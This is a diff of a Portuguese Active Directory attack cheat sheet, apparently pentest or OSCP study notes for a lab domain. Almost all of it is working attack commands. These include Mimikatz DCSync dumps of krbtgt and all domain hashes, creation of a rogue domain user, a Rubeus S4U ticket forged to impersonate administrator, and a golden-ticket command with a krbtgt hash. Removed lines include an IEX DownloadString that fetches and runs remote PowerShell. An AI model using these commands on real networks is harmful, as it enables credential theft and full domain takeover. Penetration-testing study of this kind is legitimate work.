@@ -1370,7 +1370,7 @@ lsadump::dcsync /domain:TECH.LOCAL /all /csv
 ```
 OPÇÃO 2 - CRIAR UMA CONTA NO DOMINIO
 ```
-$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String 123qwe..
+$PASSWORD= ConvertTo-SecureString -AsPlainText -Force -String 123qwe..
 New-ADUser -Name "pentester" -Description "Pentester User" -Enabled $true -AccountPassword $PASSWORD
 ```
 OPÇÃO 3 - ACESSAR REMOTAMENTE VIA PSREMOTE
@@ -1463,7 +1463,7 @@ ATAQUE DCSYNC:
 lsadump::dcsync /user:tech\krbtgt
 lsadump::dcsync /domain:TECH.LOCAL /all /csv
 ```
-OPÇÃO 2 - ACESSAR REMOTAMENTE VIA PSREMOTE
+- OPÇÃO 2 - ACESSAR REMOTAMENTE VIA PSREMOTE
 OBTER TICKET: host,http,wsman,rpcss
 ```
 rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:host,http,wsman,rpcss /ptt 
@@ -1472,25 +1472,16 @@ ACESSAR REMOTAMENTE:
 ```
 enter-pssession -computername TECH-DC01.TECH.LOCAL
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-##### CONSTRAINED DELEGATION RUBEUS - LOAD REQUIREMENTS
+- OPÇÃO 3 - CRIAR GOLDEN TICKETS
 ```
-curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
+kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
 ```
-```
-IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Rubeus.ps1")
-```
+
+
+
+
+
+
 
 
 
